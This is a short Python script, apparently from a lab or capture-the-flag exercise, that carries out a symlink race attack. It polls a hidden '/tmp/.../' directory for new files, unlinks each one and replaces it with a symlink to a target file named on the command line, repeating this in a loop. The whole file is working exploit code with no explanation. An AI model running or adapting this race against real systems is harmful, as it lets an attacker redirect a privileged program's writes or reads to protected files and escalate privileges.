import os
import time
import sys

def main():

    tmp_folder = "/tmp/.../"
    target_file = sys.argv[1]
    known_files = os.listdir(tmp_folder)

    for _ in range(100):

        tmp_file = tmp_folder + find_file(tmp_folder, known_files)
        print("File found:", tmp_file)
        file_race(tmp_file, target_file)
        time.sleep(0.3)

def find_file(tmp_folder, known_files):

    time.sleep(0.02)
    while True:
        for f in os.listdir(tmp_folder):
            if f not in known_files:
                return f


def file_race(tmp_file, target_file):
    
    try:
        os.unlink(tmp_file)
        os.symlink(target_file, tmp_file)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
